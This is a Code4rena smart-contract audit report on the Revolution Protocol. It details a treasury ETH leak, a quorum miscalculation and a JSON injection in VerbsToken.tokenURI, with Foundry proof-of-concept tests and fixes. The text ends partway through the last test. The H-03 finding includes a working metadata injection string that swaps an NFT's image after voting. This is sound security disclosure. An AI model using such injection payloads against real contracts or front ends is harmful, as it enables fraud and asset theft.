---
sponsor: "Collective"
slug: "2023-12-revolutionprotocol"
date: "2024-02-08"
title: "Revolution Protocol "
findings: "https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues"
contest: 311
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Revolution Protocol  smart contract system written in Solidity. The audit took place between December 13—December 21 2023.

## Wardens

107 Wardens contributed reports to Revolution Protocol:

  1. [bart1e](https://code4rena.com/@bart1e)
  2. [KingNFT](https://code4rena.com/@KingNFT)
  3. [0xDING99YA](https://code4rena.com/@0xDING99YA)
  4. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  5. [zhaojie](https://code4rena.com/@zhaojie)
  6. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  7. [osmanozdemir1](https://code4rena.com/@osmanozdemir1)
  8. [cccz](https://code4rena.com/@cccz)
  9. [ArmedGoose](https://code4rena.com/@ArmedGoose)
  10. [jerseyjoewalcott](https://code4rena.com/@jerseyjoewalcott)
  11. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  12. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  13. [hals](https://code4rena.com/@hals)
  14. [ktg](https://code4rena.com/@ktg)
  15. [0xG0P1](https://code4rena.com/@0xG0P1)
  16. [King\_](https://code4rena.com/@King_)
  17. [nmirchev8](https://code4rena.com/@nmirchev8)
  18. [Sathish9098](https://code4rena.com/@Sathish9098)
  19. [shaka](https://code4rena.com/@shaka)
  20. [pavankv](https://code4rena.com/@pavankv)
  21. [Ward](https://code4rena.com/@Ward) ([natzuu](https://code4rena.com/@natzuu) and [0xpessimist](https://code4rena.com/@0xpessimist))
  22. [sivanesh\_808](https://code4rena.com/@sivanesh_808)
  23. [BowTiedOriole](https://code4rena.com/@BowTiedOriole)
  24. [Ryonen](https://code4rena.com/@Ryonen)
  25. [pep7siup](https://code4rena.com/@pep7siup)
  26. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  27. [0xCiphky](https://code4rena.com/@0xCiphky)
  28. [imare](https://code4rena.com/@imare)
  29. [peanuts](https://code4rena.com/@peanuts)
  30. [ihtishamsudo](https://code4rena.com/@ihtishamsudo)
  31. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  32. [SovaSlava](https://code4rena.com/@SovaSlava)
  33. [Aamir](https://code4rena.com/@Aamir)
  34. [00xSEV](https://code4rena.com/@00xSEV)
  35. [0x11singh99](https://code4rena.com/@0x11singh99)
  36. [0xAnah](https://code4rena.com/@0xAnah)
  37. [c3phas](https://code4rena.com/@c3phas)
  38. [KupiaSec](https://code4rena.com/@KupiaSec)
  39. [Tricko](https://code4rena.com/@Tricko)
  40. [mojito\_auditor](https://code4rena.com/@mojito_auditor)
  41. [0xmystery](https://code4rena.com/@0xmystery)
  42. [ast3ros](https://code4rena.com/@ast3ros)
  43. [wintermute](https://code4rena.com/@wintermute)
  44. [\_eperezok](https://code4rena.com/@_eperezok)
  45. [deth](https://code4rena.com/@deth)
  46. [XDZIBECX](https://code4rena.com/@XDZIBECX)
  47. [Ocean\_Sky](https://code4rena.com/@Ocean_Sky)
  48. [BARW](https://code4rena.com/@BARW) ([BenRai](https://code4rena.com/@BenRai) and [albertwh1te](https://code4rena.com/@albertwh1te))
  49. [ayden](https://code4rena.com/@ayden)
  50. [deepplus](https://code4rena.com/@deepplus)
  51. [Brenzee](https://code4rena.com/@Brenzee)
  52. [AS](https://code4rena.com/@AS)
  53. [fnanni](https://code4rena.com/@fnanni)
  54. [0xAsen](https://code4rena.com/@0xAsen)
  55. [Pechenite](https://code4rena.com/@Pechenite) ([Bozho](https://code4rena.com/@Bozho) and [radev\_sw](https://code4rena.com/@radev_sw))
  56. [wangxx2026](https://code4rena.com/@wangxx2026)
  57. [Inference](https://code4rena.com/@Inference)
  58. [dimulski](https://code4rena.com/@dimulski)
  59. [rouhsamad](https://code4rena.com/@rouhsamad)
  60. [haxatron](https://code4rena.com/@haxatron)
  61. [ke1caM](https://code4rena.com/@ke1caM)
  62. [Raihan](https://code4rena.com/@Raihan)
  63. [hakymulla](https://code4rena.com/@hakymulla)
  64. [plasmablocks](https://code4rena.com/@plasmablocks)
  65. [Abdessamed](https://code4rena.com/@Abdessamed)
  66. [0xlemon](https://code4rena.com/@0xlemon)
  67. [twcctop](https://code4rena.com/@twcctop)
  68. [0xluckhu](https://code4rena.com/@0xluckhu)
  69. [n1punp](https://code4rena.com/@n1punp)
  70. [Udsen](https://code4rena.com/@Udsen)
  71. [ABAIKUNANBAEV](https://code4rena.com/@ABAIKUNANBAEV)
  72. [mahdirostami](https://code4rena.com/@mahdirostami)
  73. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  74. [jnforja](https://code4rena.com/@jnforja)
  75. [IllIllI](https://code4rena.com/@IllIllI)
  76. [wahedtalash77](https://code4rena.com/@wahedtalash77)
  77. [unique](https://code4rena.com/@unique)
  78. [albahaca](https://code4rena.com/@albahaca)
  79. [Aymen0909](https://code4rena.com/@Aymen0909)
  80. [adeolu](https://code4rena.com/@adeolu)
  81. [passteque](https://code4rena.com/@passteque)
  82. [SadeeqXmosh](https://code4rena.com/@SadeeqXmosh) ([0xMosh](https://code4rena.com/@0xMosh) and [Oxsadeeq](https://code4rena.com/@Oxsadeeq))
  83. [Timenov](https://code4rena.com/@Timenov)
  84. [JCK](https://code4rena.com/@JCK)
  85. [SAQ](https://code4rena.com/@SAQ)
  86. [donkicha](https://code4rena.com/@donkicha)
  87. [lsaudit](https://code4rena.com/@lsaudit)
  88. [naman1778](https://code4rena.com/@naman1778)
  89. [roland](https://code4rena.com/@roland)
  90. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  91. [spacelord47](https://code4rena.com/@spacelord47)
  92. [developerjordy](https://code4rena.com/@developerjordy)
  93. [0xhitman](https://code4rena.com/@0xhitman)
  94. [Topmark](https://code4rena.com/@Topmark)
  95. [leegh](https://code4rena.com/@leegh)
  96. [pontifex](https://code4rena.com/@pontifex)
  97. [0xHelium](https://code4rena.com/@0xHelium)
  98. [AkshaySrivastav](https://code4rena.com/@AkshaySrivastav)
  99. [y4y](https://code4rena.com/@y4y)
  100. [ptsanev](https://code4rena.com/@ptsanev)
  101. [0x175](https://code4rena.com/@0x175)
  102. [McToady](https://code4rena.com/@McToady)
  103. [TermoHash](https://code4rena.com/@TermoHash)

This audit was judged by [0xTheC0der](https://code4rena.com/@0xTheC0der).

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 18 unique vulnerabilities. Of these vulnerabilities, 4 received a risk rating in the category of HIGH severity and 14 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 34 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 17 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Revolution Protocol repository](https://github.com/code-423n4/2023-12-revolutionprotocol), and is composed of 7 smart contracts written in the Solidity programming language and includes 919 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **vuln-detector** from warden [oualidpro](https://code4rena.com/@oualidpro), generated the [Automated Findings report](https://gist.github.com/code423n4/172fdd8342981c9d0f72aa70a88c3f9d) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (4)
## [[H-01] Incorrect amounts of ETH are transferred to the DAO treasury in `ERC20TokenEmitter::buyToken()`, causing a value leak in every transaction](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/210)
*Submitted by [osmanozdemir1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/210), also found by [shaka](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/651), [SovaSlava](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/586), [KupiaSec](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/457), [MrPotatoMagic](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/418), [ast3ros](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/406), [BARW](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/398), [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/361), [0xCiphky](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/331), [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/289), [ktg](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/263), [AS](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/216), [SpicyMeatball](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/174), [hakymulla](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/171), [plasmablocks](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/162), [Abdessamed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/153), [0xlemon](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/117), [twcctop](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/109), [0xluckhu](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/36), and [n1punp](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/13)*

While users buying governance tokens with `ERC20TokenEmitter::buyToken` function, some portion of the provided ETH is reserved for creators according to the [`creatorRateBps`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L42).

A part of this creator's reserved ETH is directly sent to the creators according to [`entropyRateBps`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L45), and the remaining part is used to buy governance tokens for creators.

That remaining part, which is used to buy governance tokens, is never sent to the DAO treasury. It is locked in the `ERC20Emitter` contract, causing value leaks for treasury in every `buyToken` function call.

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L190C1-L198C10>

```solidity
    function buyToken(
        address[] calldata addresses,
        uint[] calldata basisPointSplits,
        ProtocolRewardAddresses calldata protocolRewardsRecipients
    ) public payable nonReentrant whenNotPaused returns (uint256 tokensSoldWad) {
    // ...

        // Get value left after protocol rewards
        uint256 msgValueRemaining = _handleRewardsAndGetValueToSend(
            msg.value,
            protocolRewardsRecipients.builder,
            protocolRewardsRecipients.purchaseReferral,
            protocolRewardsRecipients.deployer
        );

        //Share of purchase amount to send to treasury
        uint256 toPayTreasury = (msgValueRemaining * (10_000 - creatorRateBps)) / 10_000;

        //Share of purchase amount to reserve for creators
        //Ether directly sent to creators
        uint256 creatorDirectPayment = ((msgValueRemaining - toPayTreasury) * entropyRateBps) / 10_000;
        //Tokens to emit to creators
        int totalTokensForCreators = ((msgValueRemaining - toPayTreasury) - creatorDirectPayment) > 0
            ? getTokenQuoteForEther((msgValueRemaining - toPayTreasury) - creatorDirectPayment)
            : int(0);

        // Tokens to emit to buyers
        int totalTokensForBuyers = toPayTreasury > 0 ? getTokenQuoteForEther(toPayTreasury) : int(0);

        //Transfer ETH to treasury and update emitted
        emittedTokenWad += totalTokensForBuyers;
        if (totalTokensForCreators > 0) emittedTokenWad += totalTokensForCreators;

        //Deposit funds to treasury
-->     (bool success, ) = treasury.call{ value: toPayTreasury }(new bytes(0)); //@audit-issue Treasury is not paid correctly. Only the buyers share is sent. Creators share to buy governance tokens are not sent to treasury
        require(success, "Transfer failed.");                                   //@audit `creators total share` - `creatorDirectPayment` should also be sent to treasury. ==> Which is "((msgValueRemaining - toPayTreasury) - creatorDirectPayment)"

        //Transfer ETH to creators
        if (creatorDirectPayment > 0) {
            (success, ) = creatorsAddress.call{ value: creatorDirectPayment }(new bytes(0));
            require(success, "Transfer failed.");
        }

        // ... rest of the code
    }
```

In the code above:

`toPayTreasury` is the buyer's portion of the sent ether.\
`(msgValueRemaining - toPayTreasury)` is the creator's portion of the sent ether.\
`((msgValueRemaining - toPayTreasury) - creatorDirectPayment)` is the remaining part of the creator's share after direct payment *(which is used to buy the governance token).*

As we can see above, the part that is used to buy governance tokens is not sent to the treasury. Only the buyer's portion is sent.

### Impact

*   DAO treasury is not properly paid even though the corresponding governance tokens are minted.

*   Every `buyToken` transaction will cause a value leak to the DAO treasury. The leaked ETH amounts are stuck in the `ERC20TokenEmitter` contract.

### Proof of Concept

**Coded PoC**

You can use the protocol's own test suite to run this PoC.

\-Copy and paste the snippet below into the `ERC20TokenEmitter.t.sol` test file.\
\-Run it with `forge test --match-test testBuyToken_ValueLeak -vvv`

<details>

```solidity
function testBuyToken_ValueLeak() public {
        
        // Set creator and entropy rates.
        // Creator rate will be 10% and entropy rate will be 40%
        uint256 creatorRate = 1000;
        uint256 entropyRate = 5000;
        vm.startPrank(address(dao));
        erc20TokenEmitter.setCreatorRateBps(creatorRate);
        erc20TokenEmitter.setEntropyRateBps(entropyRate);

        // Check dao treasury and erc20TokenEmitter balances. Balance of both of them should be 0.
        uint256 treasuryETHBalance_BeforePurchase = address(erc20TokenEmitter.treasury()).balance;
        uint256 emitterContractETHBalance_BeforePurchase = address(erc20TokenEmitter).balance;
        
        assertEq(treasuryETHBalance_BeforePurchase, 0);
        assertEq(emitterContractETHBalance_BeforePurchase, 0);

        // Create token purchase parameters
        address[] memory recipients = new address[](1);
        recipients[0] = address(1);
        uint256[] memory bps = new uint256[](1);
        bps[0] = 10_000;

        // Give some ETH to user and buy governance token.
        vm.startPrank(address(0));
        vm.deal(address(0), 100000 ether);

        erc20TokenEmitter.buyToken{ value: 100 ether }(
            recipients,
            bps,
            IERC20TokenEmitter.ProtocolRewardAddresses({
                builder: address(0),
                purchaseReferral: address(0),
                deployer: address(0)
            })
        );

        // User bought 100 ether worth of tokens.
        // Normally with 2.5% fixed protocol rewards, 10% creator share and 50% entropy share: 
        //  ->  2.5 ether is protocol rewards.
        //  ->  87.75 ether is buyer share (90% of the 97.5)
        //  ->  9.75 of the ether is creators share
        //          - 4.875 ether directly sent to creators
        //          - 4.875 ether should be used to buy governance token and should be sent to the treasury.
        // However, the 4.875 ether is never sent to the treasury even though it is used to buy governance tokens. It is stuck in the Emitter contract. 

        // Check balances after purchase.
        uint256 treasuryETHBalance_AfterPurchase = address(erc20TokenEmitter.treasury()).balance;
        uint256 emitterContractETHBalance_AfterPurchase = address(erc20TokenEmitter).balance;
        uint256 creatorETHBalance_AfterPurchase = address(erc20TokenEmitter.creatorsAddress()).balance;

        // Creator direct payment amount is 4.875 as expected
        assertEq(creatorETHBalance_AfterPurchase, 4.875 ether);
        
        // Dao treasury has 87.75 ether instead of 92.625 ether. 
        // 4.875 ether that is used to buy governance tokens for creators is never sent to treasury and still in the emitter contract.
        assertEq(treasuryETHBalance_AfterPurchase, 87.75 ether);
        assertEq(emitterContractETHBalance_AfterPurchase, 4.875 ether);
    }
```

</details>

Results after running the test:

```solidity
Running 1 test for test/token-emitter/ERC20TokenEmitter.t.sol:ERC20TokenEmitterTest
[PASS] testBuyToken_ValueLeak() (gas: 459490)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.25ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Tools Used

Foundry

### Recommended Mitigation Steps

I would recommend transferring the remaining ETH used to buy governance tokens to the treasury.

```diff
+       uint256 creatorsEthAfterDirectPayment = ((msgValueRemaining - toPayTreasury) - creatorDirectPayment);

         //Deposit funds to treasury
-       (bool success, ) = treasury.call{ value: toPayTreasury }(new bytes(0));
+       (bool success, ) = treasury.call{ value: toPayTreasury + creatorsEthAfterDirectPayment }(new bytes(0));
        require(success, "Transfer failed.");
```

**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/210#issuecomment-1883282354)**

***

## [[H-02] `ArtPiece.totalVotesSupply` and `ArtPiece.quorumVotes` are incorrectly calculated due to inclusion of the inaccessible voting powers of the NFT that is being auctioned at the moment when an art piece is created](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/168)
*Submitted by [osmanozdemir1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/168), also found by [hals](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/505), [0xG0P1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/417), [King\_](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/291), [SpicyMeatball](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/146), [ktg](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/115), and [rvierdiiev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/18)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L228> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L234>

In this protocol, art pieces are uploaded, voted on by the community and auctioned. Being the highest-voted art piece is not enough to go to auction, and that art piece also must reach the quorum.

The quorum for the art piece is determined according to the total vote supply when the art piece is created. This total vote supply is calculated according to the current supply of the `erc20VotingToken` and `erc721VotingToken`. `erc721VotingTokens` have [weight](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L44C3-L45C44) compared to regular `erc20VotingTokens` and ERC721 tokens give users much more voting power.

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L226C1-L229C11>

```solidity
file: CultureIndex.sol
    function createPiece ...{
        // ...
        newPiece.totalVotesSupply = _calculateVoteWeight(
            erc20VotingToken.totalSupply(),
-->         erc721VotingToken.totalSupply() //@audit-issue This includes the erc721 token which is currently on auction. No one can use that token to vote on this piece.
        );
        // ...
-->     newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000; //@audit quorum votes will also be higher than it should be.
        // ...
    }
    
```

`_calculateVoteWeight` function:

```solidity
    function _calculateVoteWeight(uint256 erc20Balance, uint256 erc721Balance) internal view returns (uint256) {
        return erc20Balance + (erc721Balance * erc721VotingTokenWeight * 1e18);
    }
```

As I mentioned above, `totalVotesSupply` and `quorumVotes` of an art piece are calculated when the art piece is created based on the total supplies of the erc20 and erc721 tokens.

However, there is an important logic/context issue here.\
This calculation includes the erc721 verbs token which is **currently on auction** and sitting in the `AuctionHouse` contract. The voting power of this token can never be used for that art piece because:

1.  `AuctionHouse` contract obviously can not vote.

2.  The future buyer of this NFT also can not vote since users' right to vote is determined based on the [creation block](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L313C26-L313C77) of the art piece.

In the end, totally inaccessible voting powers are included when calculating `ArtPiece.totalVotesSupply` and `ArtPiece.quorumVotes`, which results in incorrect quorum requirements and makes it harder to reach the quorum.

### Impact

*   Quorum vote requirements for created art pieces will be incorrect if there is an ongoing auction at the time the art piece is created.

*   This will make it harder to reach the quorum.

*   Unfair situations can occur between two art pieces (*different totalVotesSuppy, different quorum requirements, but the same accessible/actual vote supply*)

I also would like to that add the impact of this issue is not linear. It will decrease over time with the `erc721VotingToken` supply starts to increase day by day.

The impact is much higher in the early phase of the protocol, especially in the first days/weeks after the protocol launch where the `verbsToken` supply is only a handful.

### Proof of Concept

Let's assume that:\
\-The current `erc20VotingToken` supply is 1000 and it won't change for this scenario.\
\-The weight of `erc721VotingToken` is 100.\
\-`quorumVotesBPS` is 5000 (50% quorum required)

**Day 0: Protocol Launched**

1.  Users started to upload their art pieces.

2.  There is no NFT minted yet.

3.  The total votes supply for all of these art pieces is 1000.

**Day 1: First Mint**

1.  One of the art pieces is chosen.

2.  The art piece is minted in `VerbsToken` contract and transferred to `AuctionHouse` contract.

3.  The auction has started.

4.  `erc721VotingToken` supply is 1 at the moment.

5.  Users keep uploading art pieces for the next day's auction.

6.  For these art pieces uploaded on day 1:\
    `totalVotesSupply` is 1100\
    `quorumVotes` is 550\
    **Accessible vote supply is still 1000**.

7.  According to accessible votes, the quorum rate is 55% not 50.

**Day 2: Next Day**

1.  The auction on the first day is concluded and transferred to the buyer.

2.  The next `verbsToken` is minted and the auction is started.

3.  `erc721VotingToken` supply is 2.

4.  Users keep uploading art pieces for the next day's auction.

5.  For these art pieces uploaded on day 2:\
    `totalVotesSupply` is 1200\
    `quorumVotes` is 600\
    **Accessible vote supply is 1100**. (1000 + 100 from the buyer of the first NFT)

6.  The actual quorum rate for these art pieces is \~54.5% (600 / 1100).

_NOTE: The numbers used here are just for demonstration purposes. The impact will be much much higher if the `erc721VotingToken` weight is a bigger value like 1000._

### Recommended Mitigation Steps

I strongly recommend subtracting the voting power of the NFT currently on auction when calculating the vote supply of the art piece and the quorum requirements.

```diff
// Note: You will also need to store auctionHouse contract address
in this contract.
+   address auctionHouse;

    function createPiece () {
    ...

        newPiece.totalVotesSupply = _calculateVoteWeight(
            erc20VotingToken.totalSupply(),
-           erc721VotingToken.totalSupply()
+           // Note: We don't subtract 1 as fixed amount in case of auction house being paused and not having an NFT at that moment. We only subtract if there is an ongoing auction. 
+           erc721VotingToken.totalSupply() - erc721VotingToken.balanceOf(auctionHouse)
        );

    ...
    }
```

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/168#issuecomment-1879782583):**
 > @rocketman-21 Requesting additional sponsor input on this one.  
> This seems to be valid to me after a first review.

**[rocketman-21 (Revolution) confirmed and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/168#issuecomment-1881977475):**
 > Super valid ty sirs.

**[0xTheC0der (Judge) increased severity to High and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/168#issuecomment-1885404619):**
 > Severity increase was discussed with sponsor privately.
 
***

## [[H-03] `VerbsToken.tokenURI()` is vulnerable to JSON injection attacks](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167)
*Submitted by [KingNFT](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167), also found by [ZanyBonzy](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/270) and [ArmedGoose](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/53)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L209> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L193>

`CultureIndex.createPiece()` function doesn't sanitize malicious charcacters in `metadata.image` and `metadata.animationUrl`,  which would cause `VerbsToken.tokenURI()` suffering various JSON injection attack vectors.

1.  If the front end APP doesn't process the JSON string properly, such as using `eval()` to parse token URI, then any malicious code can be executed in the front end. Obviously, funds in users' connected wallet, such as Metamask, might be stolen in this case.

2.  Even while the front end processes securely, such as using the standard builtin `JSON.parse()` to read URI. Adversary can still exploit this vulnerability to replace art piece image/animation with arbitrary other ones after voting stage completed.

That is the final metadata used by the NFT (VerbsToken) is not the art piece users vote. This attack could be benefit to attackers, such as creating NFTs containing same art piece data with existing high price NFTs. And this attack could also make the project sufferring legal risks, such as creating NFTs with violence or pornography images.

More reference: <https://www.comparitech.com/net-admin/json-injection-guide/>

### Proof of Concept

As shown of `createPiece()` function, there is no check if `metadata.image` and `metadata.animationUrl` contain malicious charcacters, such as `"`, `:` and `,`.

```solidity
File: src\CultureIndex.sol
209:     function createPiece(
210:         ArtPieceMetadata calldata metadata,
211:         CreatorBps[] calldata creatorArray
212:     ) public returns (uint256) {
213:         uint256 creatorArrayLength = validateCreatorsArray(creatorArray);
214: 
215:         // Validate the media type and associated data
216:         validateMediaType(metadata);
217: 
218:         uint256 pieceId = _currentPieceId++;
219: 
220:         /// @dev Insert the new piece into the max heap
221:         maxHeap.insert(pieceId, 0);
222: 
223:         ArtPiece storage newPiece = pieces[pieceId];
224: 
225:         newPiece.pieceId = pieceId;
226:         newPiece.totalVotesSupply = _calculateVoteWeight(
227:             erc20VotingToken.totalSupply(),
228:             erc721VotingToken.totalSupply()
229:         );
230:         newPiece.totalERC20Supply = erc20VotingToken.totalSupply();
231:         newPiece.metadata = metadata;
232:         newPiece.sponsor = msg.sender;
233:         newPiece.creationBlock = block.number;
234:         newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000;
235: 
236:         for (uint i; i < creatorArrayLength; i++) {
237:             newPiece.creators.push(creatorArray[i]);
238:         }
239: 
240:         emit PieceCreated(pieceId, msg.sender, metadata, newPiece.quorumVotes, newPiece.totalVotesSupply);
241: 
242:         // Emit an event for each creator
243:         for (uint i; i < creatorArrayLength; i++) {
244:             emit PieceCreatorAdded(pieceId, creatorArray[i].creator, msg.sender, creatorArray[i].bps);
245:         }
246: 
247:         return newPiece.pieceId;
248:     }

```

Adverary can exploit this to make `VerbsToken.tokenURI()` to return various malicious JSON objects to front end APP.

```solidity

File: src\Descriptor.sol
097:     function constructTokenURI(TokenURIParams memory params) public pure returns (string memory) {
098:         string memory json = string(
099:             abi.encodePacked(
100:                 '{"name":"',
101:                 params.name,
102:                 '", "description":"',
103:                 params.description,
104:                 '", "image": "',
105:                 params.image,
106:                 '", "animation_url": "',
107:                 params.animation_url,
108:                 '"}'
109:             )
110:         );
111:         return string(abi.encodePacked("data:application/json;base64,", Base64.encode(bytes(json))));
112:     }

```

For example, if attacker submit the following metadata:

```solidity
ICultureIndex.ArtPieceMetadata({
            name: 'Mona Lisa',
            description: 'A renowned painting by Leonardo da Vinci',
            mediaType: ICultureIndex.MediaType.IMAGE,
            image: 'ipfs://realMonaLisa',
            text: '',
            animationUrl: '", "image": "ipfs://fakeMonaLisa' // malicious string injected
        });
```

During voting stage, front end gets `image` field by `CultureIndex.pieces[pieceId].metadata.image`, which is `ipfs://realMonaLisa`. But, after voting complete, art piece is minted to `VerbsToken` NFT. Now, front end would query `VerbsToken.tokenURI(tokenId)` to get base64 encoded metadata, which would be:

```solidity
data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=
```

In the front end, we use `JSON.parse()` to parse the above data, we get `image` as `ipfs://fakeMonaLisa`.
![image](https://c2n.me/4jZPsiZ.png)
Image link: <https://gist.github.com/assets/68863517/d769d7ac-db02-4e3b-94d2-dfaf3752b763>

Below is the full coded PoC:

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {RevolutionBuilderTest} from "./RevolutionBuilder.t.sol";
import {ICultureIndex} from "../src/interfaces/ICultureIndex.sol";

contract JsonInjectionAttackTest is RevolutionBuilderTest {
    string public tokenNamePrefix = "Vrb";
    string public tokenName = "Vrbs";
    string public tokenSymbol = "VRBS";

    function setUp() public override {
        super.setUp();
        super.setMockParams();

        super.setERC721TokenParams(tokenName, tokenSymbol, "https://example.com/token/", tokenNamePrefix);

        super.setCultureIndexParams("Vrbs", "Our community Vrbs. Must be 32x32.", 10, 500, 0);

        super.deployMock();
    }

    function testImageReplacementAttack() public {
        ICultureIndex.CreatorBps[] memory creators = _createArtPieceCreators();
        ICultureIndex.ArtPieceMetadata memory metadata = ICultureIndex.ArtPieceMetadata({
            name: 'Mona Lisa',
            description: 'A renowned painting by Leonardo da Vinci',
            mediaType: ICultureIndex.MediaType.IMAGE,
            image: 'ipfs://realMonaLisa',
            text: '',
            animationUrl: '", "image": "ipfs://fakeMonaLisa' // malicious string injected
        });

        uint256 pieceId = cultureIndex.createPiece(metadata, creators);

        vm.startPrank(address(erc20TokenEmitter));
        erc20Token.mint(address(this), 10_000e18);
        vm.stopPrank();
        vm.roll(block.number + 1); // ensure vote snapshot is taken
        cultureIndex.vote(pieceId);

        // 1. the image used during voting stage is 'ipfs://realMonaLisa'
        ICultureIndex.ArtPiece memory topPiece = cultureIndex.getTopVotedPiece();
        assertEq(pieceId, topPiece.pieceId);
        assertEq(keccak256("ipfs://realMonaLisa"), keccak256(bytes(topPiece.metadata.image)));

        // 2. after being minted to VerbsToken, the image becomes to 'ipfs://fakeMonaLisa'
        vm.startPrank(address(auction));
        uint256 tokenId = erc721Token.mint();
        vm.stopPrank();
        assertEq(pieceId, tokenId);
        string memory encodedURI = erc721Token.tokenURI(tokenId);
        console2.log(encodedURI);
        string memory prefix = _substring(encodedURI, 0, 29);
